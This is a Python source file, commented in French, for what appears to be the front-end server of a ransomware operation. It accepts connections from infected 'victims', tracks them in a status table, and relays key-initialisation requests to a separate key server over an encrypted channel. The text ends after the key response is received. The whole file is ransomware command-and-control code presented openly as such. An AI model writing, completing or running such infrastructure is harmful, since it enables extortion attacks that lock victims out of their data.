import threading
import utile.security as security
import queue
import socket
from threading import Thread
import utile.configgetter as config
import utile.message as message
from utile.network import recv_msg, send_msg, recv_msg_clear, send_msg_clear


status_victims = {}
lock = threading.Lock()

class serveur_frontal(object):

    def __init__(self, ip, port):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port

    def start_server(self):
        queue_messages_receiv = queue.Queue()
        thread_s_cles = Thread(target=self.thread_srv_cles, args=(queue_messages_receiv,))
        thread_s_cles.start()

        queue_messages_receiv.get()
        print(f'Connection entre le serveur frontale et le serveur de clés effectuée')
        queue_messages_receiv.task_done()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        s.listen(10)
        print(f'$-F: Server started ! Waiting for clients...')
        while True:
            c_v, a_v = s.accept()
            print(f'Nouvelle victime : {a_v}')
            queue_victim = queue.Queue()
            t_v = Thread(target=self.thread_ransomware, args=(c_v, queue_messages_receiv, queue_victim,))
            t_v.start()
        s.close()

    def thread_srv_cles(self, q_messages_receiv):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((config.get_ip("config.json"), config.get_port("config.json")))

        key_f = security.diffie_hellman_recv_key(s)
        q_messages_receiv.put('CONN_SRV_CLES')
        q_messages_receiv.join()

        while True:
            msg = q_messages_receiv.get()
            if 'queue' in msg.keys():
                queue_response = msg['queue']
                msg.pop('queue')  # Retire la clé 'queue' du dictionnaire msg
            if "INITIALIZE_REQ" in msg:
                send_msg(s, msg, key_f)
                rsp = recv_msg(s, key_f)
                if "INITIALIZE_KEY" in rsp:
                    queue_response.put(rsp)


    def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
        while True:
            msg = recv_msg_clear(c_v)
            if "INITIALIZE_REQ" in msg:
                lock.acquire()
                if msg['INITIALIZE'] in status_victims.keys():
                    print(f"{msg['INITIALIZE']}")
                    lock.release()
                else:
                    status_victims[msg['INITIALIZE']] = 'INITIALIZE'
                    lock.release()
                msg['queue'] = queue_victim
                queue_messages_receiv.put(msg)
                key_rsp = queue_victim.get()